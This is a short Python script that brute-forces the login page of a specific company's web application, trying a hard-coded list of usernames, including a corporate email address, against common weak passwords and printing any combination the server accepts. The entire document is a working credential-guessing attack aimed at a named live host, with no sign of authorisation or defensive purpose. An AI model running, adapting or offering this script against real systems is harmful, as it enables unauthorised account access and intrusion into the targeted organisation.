import requests
import json

URL = 'https://mta.multitechcorp.in/mta/users/login'

users = ['root', 'user', 'accounts@multitechcorp.in','test']
passwords = ['admin', '1234', 'password','noo','mta@1234']

# for n in range(0,9999):
#     print(n)


for user in users:
    for password in passwords:
        print(f"Trying username={user} and password={password}")

        data = {
            "email_id":user,
            "password":password,
            }

        req = requests.post(URL, json=data)
        dada = json.loads(req.text)
        if dada.get("status"):
            print(f'Valid credentil: {user}:{password}')